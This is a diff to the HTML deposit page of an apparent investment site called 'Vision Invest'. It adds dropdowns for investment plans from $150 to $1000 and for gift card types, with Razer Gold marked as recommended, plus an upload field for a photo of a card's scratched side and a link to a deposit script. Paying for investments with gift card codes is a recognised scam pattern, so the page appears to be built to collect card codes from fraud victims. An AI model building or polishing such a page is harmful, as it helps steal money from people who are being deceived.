@@ -4,10 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Deposit - Vision Invest</title>
-
 <link rel="stylesheet" href="css/style.css">
 <link rel="stylesheet" href="css/responsive.css">
-
 </head>
 
 <body>
@@ -16,7 +14,7 @@
 
 <h1>Deposit Funds</h1>
 
-<p>Select an investment plan below.</p>
+<p>Select an investment plan and submit your gift card.</p>
 
 <div class="plans">
 
@@ -46,25 +44,38 @@
 
 </div>
 
-<h2>Accepted Gift Cards</h2>
+<h2>Select Your Plan</h2>
+<select id="plan-select">
+<option value="">-- Select Plan --</option>
+<option value="Starter">Starter ($150)</option>
+<option value="Silver">Silver ($300)</option>
+<option value="Gold">Gold ($500)</option>
+<option value="Premium">Premium ($1000)</option>
+</select>
 
-<select>
-<option>Select Gift Card</option>
-<option>Amazon Gift Card</option>
-<option>Razer Gold (Recommended)</option>
-<option>Apple Gift Card</option>
-<option>Paysafe Gift card</option>
+<h2>Gift Card Type</h2>
+<select id="gift-card-select">
+<option value="">-- Select Gift Card --</option>
+<option value="Amazon Gift Card">Amazon Gift Card</option>
+<option value="Razer Gold">Razer Gold (Recommended)</option>
+<option value="Apple Gift Card">Apple Gift Card</option>
+<option value="Paysafe Gift Card">Paysafe Gift Card</option>
 </select>
 
 <p class="notice">
 ⚠️ Please upload a clear photo of the scratched side of your gift card.
 </p>
 
-<input type="file" accept="image/*">
+<input type="file" id="gift-card-image" accept="image/*">
 
-<button class="btn">Submit Deposit</button>
+<p id="deposit-message" style="display:none;margin-top:10px;padding:10px;border-radius:5px;"></p>
+
+<button id="deposit-btn" class="btn">Submit Deposit</button>
+
+<p style="margin-top:15px;"><a href="dashboard.html">← Back to Dashboard</a></p>
 
 </div>
 
+<script src="js/deposit.js"></script>
 </body>
 </html>
